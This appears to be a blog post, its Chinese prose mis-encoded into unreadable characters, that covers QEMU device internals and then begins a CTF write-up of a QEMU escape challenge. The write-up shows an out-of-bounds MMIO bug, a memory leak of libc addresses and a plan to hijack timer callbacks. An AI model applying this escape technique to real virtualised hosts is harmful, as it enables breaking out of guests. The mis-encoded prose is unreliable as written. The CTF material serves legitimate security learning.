class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åœ¨eduä¸­ï¼Œclass_initï¼Œè¿™é‡Œä½¿ç”¨ObjectClassä½œä¸ºå‚æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edu_class_init</span><span class="params">(ObjectClass *<span class="keyword">class</span>, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DeviceClass *dc = <span class="built_in">DEVICE_CLASS</span>(<span class="keyword">class</span>);</span><br><span class="line">    PCIDeviceClass *k = <span class="built_in">PCI_DEVICE_CLASS</span>(<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_edu_realize;</span><br><span class="line">    k-&gt;exit = pci_edu_uninit;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e8</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">    <span class="built_in">set_bit</span>(DEVICE_CATEGORY_MISC, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Objectå¯¹è±¡ï¼š<code>Type</code>ä»¥åŠ<code>ObjectClass</code>åªæ˜¯ä¸€ä¸ªç±»å‹ï¼Œè€Œä¸æ˜¯å…·ä½“çš„è®¾å¤‡ã€‚<code>TypeInfo</code>ç»“æ„ä½“ä¸­æœ‰ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆï¼š<code>instance_init</code>ä»¥åŠ<code>class_init</code>ã€‚<code>class_init</code>æ˜¯è´Ÿè´£åˆå§‹åŒ–<code>ObjectClass</code>ç»“æ„ä½“çš„ï¼Œ<code>instance_init</code>åˆ™æ˜¯è´Ÿè´£åˆå§‹åŒ–å…·ä½“<code>Object</code>ç»“æ„ä½“çš„ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Object</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="keyword">class</span>;</span><br><span class="line">    ObjectFree *free;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="type">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>class_initä¸­çš„realizeå‡½æ•°ï¼Œå…¶ä¸­PCIDeviceä¹Ÿæ˜¯ä¸€ä¸ªå·²çŸ¥ç»“æ„ä½“</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_edu_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EduState *edu = <span class="built_in">EDU</span>(pdev);</span><br><span class="line">    <span class="type">uint8_t</span> *pci_conf = pdev-&gt;config;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pci_config_set_interrupt_pin</span>(pci_conf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">msi_init</span>(pdev, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">true</span>, <span class="literal">false</span>, errp)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">timer_init_ms</span>(&amp;edu-&gt;dma_timer, QEMU_CLOCK_VIRTUAL, edu_dma_timer, edu);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">qemu_mutex_init</span>(&amp;edu-&gt;thr_mutex);</span><br><span class="line">    <span class="built_in">qemu_cond_init</span>(&amp;edu-&gt;thr_cond);</span><br><span class="line">    <span class="built_in">qemu_thread_create</span>(&amp;edu-&gt;thread, <span class="string">&quot;edu&quot;</span>, edu_fact_thread,</span><br><span class="line">                       edu, QEMU_THREAD_JOINABLE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_io</span>(&amp;edu-&gt;mmio, <span class="built_in">OBJECT</span>(edu), &amp;edu_mmio_ops, edu,</span><br><span class="line">                    <span class="string">&quot;edu-mmio&quot;</span>, <span class="number">1</span> * MiB);</span><br><span class="line">    <span class="built_in">pci_register_bar</span>(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;edu-&gt;mmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>QOMä¼šä¸ºè®¾å¤‡Objectåˆ†é…<code>instace_size</code>å¤§å°çš„ç©ºé—´ï¼Œç„¶åè°ƒç”¨<code>instance_init</code>å‡½æ•°ï¼Œinstace åˆå§‹åŒ–ä½¿ç”¨ Object ä½œä¸ºå‚æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edu_instance_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EduState *edu = <span class="built_in">EDU</span>(obj);</span><br><span class="line"></span><br><span class="line">    edu-&gt;dma_mask = (<span class="number">1UL</span> &lt;&lt; <span class="number">28</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">object_property_add_uint64_ptr</span>(obj, <span class="string">&quot;dma_mask&quot;</span>,</span><br><span class="line">                                   &amp;edu-&gt;dma_mask, OBJ_PROP_FLAG_READWRITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="å†…å­˜ç©ºé—´"><a href="#å†…å­˜ç©ºé—´" class="headerlink" title="å†…å­˜ç©ºé—´"></a>å†…å­˜ç©ºé—´</h5><p>qemuä½¿ç”¨Â <strong>MemoryRegion</strong>Â æ¥è¡¨ç¤ºå¯¹åº”çš„å†…å­˜ç©ºé—´ï¼Œç›¸åº”çš„æ¯ä¸€ä¸ªÂ <strong>MemoryRegion</strong>Â éƒ½æœ‰å¯¹åº”çš„Â <strong>MemoryRegionOps</strong>Â æ¥æè¿°å…¶æ“åšã€‚</p>
<p>ä¹Ÿå°±æ˜¯æ³¨å†Œ mmio å’Œ pmio</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps edu_mmio_ops = &#123;</span><br><span class="line">    .read = edu_mmio_read,</span><br><span class="line">    .write = edu_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">    .valid = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">memory_region_init_io</span><span class="params">(MemoryRegion *mr,</span></span></span><br><span class="line"><span class="params"><span class="function">                           Object *owner,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">const</span> MemoryRegionOps *ops,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">void</span> *opaque,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">const</span> <span class="type">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">uint64_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>

<h5 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h5><p>opaqueæ˜¯é€æ˜çš„ï¼Œä¼šå‡ºç°ä¸€ä¸ªç±»å‹è½¬æ¢ä¸º <code>State</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ObjectClass *<span class="title">object_class_dynamic_cast_assert</span><span class="params">(ObjectClass *<span class="keyword">class</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *<span class="keyword">typename</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *file, <span class="type">int</span> line,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *func)</span></span></span><br></pre></td></tr></table></figure>

<h4 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h4><p>å†…å­˜æ‹·è´æ¯”è¾ƒæ¶ˆè€—CPUèµ„æºï¼Œå®šä¹‰ä¸€ä¸ªä¸“ç”¨çš„DMAè®¾å¤‡å¸®åŠ©CPUåšå†…å­˜æ‹·è´ï¼ŒCPUæŠŠæ•°æ®çš„åœ°å€å’Œéœ€è¦æ‹·è´åˆ°çš„ç›®çš„åœ°å€</p>
<p>éœ€è¦æ“ä½œ GuestOS ç‰©ç†å†…å­˜ï¼Œå°†è™šæ‹Ÿå†…å­˜åœ°å€è½¬æ¢ä¸ºç‰©ç†å†…å­˜ä½œä¸ºå‚æ•°</p>
<p>writeç±»ä¼¼</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> MemTxResult <span class="title">pci_dma_read</span><span class="params">(PCIDevice *dev, <span class="type">dma_addr_t</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pci_dma_rw</span>(dev, addr, buf, len,</span><br><span class="line">                      DMA_DIRECTION_TO_DEVICE, MEMTXATTRS_UNSPECIFIED);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h4><p><a href="https://martins3.github.io/qemu/timer.html">QEMU ä¸­çš„æ—¶é’Ÿ</a></p>
<p>qemuæ”¯æŒå››ç§æ—¶é’Ÿ</p>
<ul>
<li>QEMU_CLOCK_REALTIME ä¸å—è™šæ‹Ÿç³»ç»Ÿçš„å½±å“ï¼Œéšæ—¶é—´æµé€è€Œç´¯åŠ è®¡æ•°</li>
<li>QEMU_CLOCK_VIRTUAL è™šæ‹Ÿæ—¶é’Ÿï¼Œè®°å½•è™šæ‹Ÿç³»ç»Ÿçš„æ—¶é—´æ»´ç­”</li>
<li>QEMU_CLOCK_HOST è¿™ä¸ªç±»ä¼¼å¢™ä¸Šæ—¶é’Ÿï¼Œä¿®æ”¹å®¿ä¸»æœºç³»ç»Ÿæ—¶é—´ä¼šæ”¹å˜è¿™ä¸ªæ—¶é—´</li>
<li>QEMU_CLOCK_VIRTUAL_RT åœ¨éicountæ¨¡å¼ä¸‹å’ŒQEMU_CLOCK_VIRTUALï¼Œåœ¨icountæ¨¡å¼ä¸‹äºQEMU_CLOCK_VIRTUALä¸åŒçš„æ˜¯åœ¨è™šæ‹Ÿcpuä¼‘çœ çš„æ—¶å€™è¯¥å€¼ä¹Ÿä¼šç´¯åŠ </li>
</ul>
<p>å¦‚ä¸‹ä¸ºqemuåˆå§‹åŒ–å››ç§æ—¶é’Ÿï¼Œmain_loop_tlg æ˜¯ main loop çš„ QEMUTimerListGroup, ä¹Ÿæ˜¯é»˜è®¤ä½¿ç”¨çš„ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">    QEMU_CLOCK_REALTIME = <span class="number">0</span>,</span><br><span class="line">    QEMU_CLOCK_VIRTUAL = <span class="number">1</span>,</span><br><span class="line">    QEMU_CLOCK_HOST = <span class="number">2</span>,</span><br><span class="line">    QEMU_CLOCK_VIRTUAL_RT = <span class="number">3</span>,</span><br><span class="line">    QEMU_CLOCK_MAX</span><br><span class="line">&#125; QEMUClockType;</span><br><span class="line"></span><br><span class="line"><span class="built_in">init_clocks</span>(qemu_timer_notify_cb);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_clocks</span><span class="params">(QEMUTimerListNotifyCB *notify_cb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QEMUClockType type;</span><br><span class="line">    <span class="keyword">for</span> (type = <span class="number">0</span>; type &lt; QEMU_CLOCK_MAX; type++) &#123;</span><br><span class="line">        <span class="built_in">qemu_clock_init</span>(type, notify_cb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PRCTL_PR_SET_TIMERSLACK</span></span><br><span class="line">    <span class="built_in">prctl</span>(PR_SET_TIMERSLACK, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">qemu_clock_init</span><span class="params">(QEMUClockType type, QEMUTimerListNotifyCB *notify_cb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QEMUClock *clock = <span class="built_in">qemu_clock_ptr</span>(type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assert that the clock of type TYPE has not been initialized yet. */</span></span><br><span class="line">    <span class="built_in">assert</span>(main_loop_tlg.tl[type] == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    clock-&gt;type = type;</span><br><span class="line">    clock-&gt;enabled = (type == QEMU_CLOCK_VIRTUAL ? <span class="literal">false</span> : <span class="literal">true</span>);</span><br><span class="line">    clock-&gt;last = INT64_MIN;</span><br><span class="line">    <span class="built_in">QLIST_INIT</span>(&amp;clock-&gt;timerlists);</span><br><span class="line">    <span class="built_in">notifier_list_init</span>(&amp;clock-&gt;reset_notifiers);</span><br><span class="line">    main_loop_tlg.tl[type] = <span class="built_in">timerlist_new</span>(type, notify_cb, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> QEMUClock *<span class="title">qemu_clock_ptr</span><span class="params">(QEMUClockType type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;qemu_clocks[type];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> QEMUClock qemu_clocks[QEMU_CLOCK_MAX];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>qemuæ—¶é’Ÿï¼šä¸€ä¸ªç±»å‹çš„ timer éƒ½ä¼šæ’å…¥åˆ°ç›¸åŒçš„ timerlist ä¸Šã€‚åœ¨ <code>timerlist_run_timers()</code> å‡½æ•°ä¸­å­˜åœ¨ <code>cb(opaque)</code>è°ƒç”¨ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimerListGroup</span> &#123;</span><br><span class="line">    QEMUTimerList *tl[QEMU_CLOCK_MAX];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QLIST_ENTRY(type)                                               \</span></span><br><span class="line"><span class="meta">struct &#123;                                                                \</span></span><br><span class="line"><span class="meta">        struct type *le_next;   <span class="comment">/* next element */</span>                      \</span></span><br><span class="line"><span class="meta">        struct type **le_prev;  <span class="comment">/* address of previous next element */</span>  \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimerList</span> &#123;</span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    <span class="built_in">QLIST_ENTRY</span>(QEMUTimerList) list;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist&#x27;s running */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimer</span> &#123;</span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> attributes;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">timer_init_full</span><span class="params">(QEMUTimer *ts,</span></span></span><br><span class="line"><span class="params"><span class="function">                     QEMUTimerListGroup *timer_list_group, QEMUClockType type,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="type">int</span> scale, <span class="type">int</span> attributes,</span></span></span><br><span class="line"><span class="params"><span class="function">                     QEMUTimerCB *cb, <span class="type">void</span> *opaque)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h3><p>ä¸€ç§æ˜¯ä½¿ç”¨gdbåŠ è½½è„šæœ¬ï¼Œä½†æ˜¯äº¤äº’è¾“å‡ºä¸æ˜¯å¾ˆç›´è§‚ <code>gdb -x script</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file ./qemu-system-x86_64 </span><br><span class="line"><span class="built_in">set</span> args -L ./pc-bios \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0&quot;</span> \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio.gz \</span><br><span class="line">    -device vn \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null -s</span><br><span class="line"></span><br><span class="line">start</span><br><span class="line">brva 0x114514</span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ç§æ˜¯ä½¿ç”¨ gdb è¿æ¥åˆ°è¿›ç¨‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ps -af | grep qemu</span><br><span class="line">$ gdb -x script -p &lt;pid&gt;</span><br></pre></td></tr></table></figure>

<h2 id="VNCTF2024-escape-langlang-mountain2"><a href="#VNCTF2024-escape-langlang-mountain2" class="headerlink" title="VNCTF2024 escape_langlang_mountain2"></a>VNCTF2024 escape_langlang_mountain2</h2><p>å­˜åœ¨ç¬¦å·è¡¨ï¼Œæ‰¾åˆ°å…¶è®¾å¤‡ID</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">vn_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">PCI_DEVICE_CLASS_23</span>(a1);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_vn_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x1234</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x2024</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x10</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ~# lspci</span></span><br><span class="line"><span class="comment">// 00:01.0 Class 0601: 8086:7000</span></span><br><span class="line"><span class="comment">// 00:04.0 Class 00ff: 1234:2024</span></span><br></pre></td></tr></table></figure>

<p>mmio read&#x2F;write</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">vn_mmio_read</span><span class="params">(__int64 a1, __int64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">object_dynamic_cast_assert</span>(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">21LL</span>, <span class="string">&quot;vn_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(v4 + <span class="number">0xB80</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(*(<span class="type">int</span> *)(v4 + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">vn_mmio_write</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> __int64 val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="built_in">object_dynamic_cast_assert</span>(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">42LL</span>, <span class="string">&quot;vn_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(v5 + <span class="number">0xB84</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v5 + *(<span class="type">int</span> *)(v5 + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL) = val;</span><br><span class="line">      *(_DWORD *)(v5 + <span class="number">0xB84</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)val &lt;= <span class="number">0x3c</span> )</span><br><span class="line">        *(_DWORD *)(v5 + <span class="number">0xB80</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> &amp;&amp; <span class="built_in">HIDWORD</span>(val) &lt;= <span class="number">0x3C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v5 + <span class="built_in">HIDWORD</span>(val) + <span class="number">0xB40</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨ä¸€ä¸ªæ•°ç»„è¶Šç•Œé—®é¢˜ï¼Œintç±»å‹å¯ä»¥æ˜¯è´Ÿæ•°ã€‚å› æ­¤è®¾ç½® <code>0xb80</code> å€¼ä¸º <code>-0xb38/-0xb34</code> è¯»å– <code>g_free</code>ï¼Œç„¶åmmio_readæ³„éœ²å‡ºlibc_baseã€‚åŒæ ·çš„æ–¹æ³•å¯ä»¥æ³„éœ²å‡½æ•°åŸºåœ°å€ï¼Œè·å¾—ç¨‹åºåŸºå€ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele <span class="number">0x563076e46c30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rax <span class="number">0x563076e46c30</span> â€”â–¸ <span class="number">0x563075f58410</span> â€”â–¸ <span class="number">0x563075e16170</span> â€”â–¸ <span class="number">0x563075e162f0</span> â—‚â€” <span class="number">0x6e76</span> <span class="comment">/* &#x27;vn&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚     <span class="number">0x563076e46c38</span> â€”â–¸ <span class="number">0x7faffb78bd50</span> (g_free) â—‚â€” endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚     <span class="number">0x563076e46c40</span> â€”â–¸ <span class="number">0x563076dfa5e0</span> â—‚â€” <span class="number">0x8</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚     <span class="number">0x563076e46c48</span> â—‚â€” <span class="number">9</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚     <span class="number">0x563076e46c50</span> â€”â–¸ <span class="number">0x5630760bfaa0</span> â€”â–¸ <span class="number">0x563075ff81a0</span> â€”â–¸ <span class="number">0x563075e5f3b0</span> â€”â–¸ <span class="number">0x563075e5f530</span> â—‚â€” ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚     <span class="number">0x563076e46c58</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚     <span class="number">0x563076e46c60</span> â€”â–¸ <span class="number">0x5630760c7550</span> â—‚â€” <span class="string">&#x27;/machine/peripheral-anon/device[0]&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚     <span class="number">0x563076e46c68</span> â—‚â€” <span class="number">0x1</span></span><br></pre></td></tr></table></figure>


<p>å¦‚ä½•è¿›è¡Œæ‰§è¡Œæµçš„åŠ«æŒï¼Ÿ</p>
<ul>
<li>çœ‹å‡ºé¢˜äººWP <a href="https://github.com/xtxtn/vnctf2024-escape_langlang_mountain2wp">escape_langlang_mountain2 WP</a></li>
</ul>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit 1"></a>Exploit 1</h3><p>ä¸ä¾èµ–ä»»ä½•è®¾å¤‡çš„å‡½æ•°ï¼Œç›´æ¥ä¼ªé€ QEMUTimerListå’ŒQEMUTimerï¼Œä¿®æ”¹qemuçš„å…¨å±€å˜é‡ main_loop_tlg çš„æˆå‘˜å˜é‡å€¼ã€‚ç­‰å¾…QEMUTimerä¸­çš„cb(opaque)å»è‡ªåŠ¨æ‰§è¡Œã€‚åœ¨<code>timerlist_run_timers</code>å‡½æ•°ä¸­ï¼Œ<code>ts = timer_list-&gt;active_timers</code>ï¼Œæœ€åå†å»è°ƒç”¨tsè¿™ä¸ªQEMUTimerä¸­çš„cb(opaque)ï¼Œé‚£ä¹ˆç›´æ¥ä¿®æ”¹<code>timer_list-&gt;active_timers</code>ä¸ºä¸€ä¸ªä¼ªé€ çš„QEMUTimeråœ°å€ä¾ç„¶å¯ä»¥è¾¾åˆ°ç›®çš„</p>
<p><a href="https://a1ex.online/2021/10/24/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">CVE-2019-6788-Qemué€ƒé€¸æ¼æ´å¤ç°ä¸åˆ†æ</a></p>
<p>MemoryRegionçš„ç»“æ„ä½“åœ¨ç¼“å†²åŒºä¹‹ä¸Šï¼Œé€šè¿‡è®¾ç½®å¥½è´Ÿæ•°è¯»å–opsçš„åœ°å€å°±å¯ä»¥å®ç°å¯¹qemuåœ°å€æ³„æ¼ï¼Œè¯»å–opaqueçš„åœ°å€ä¹Ÿå°±çŸ¥é“vnè®¾å¤‡åœ¨å †ä¸­çš„åœ°å€</p>
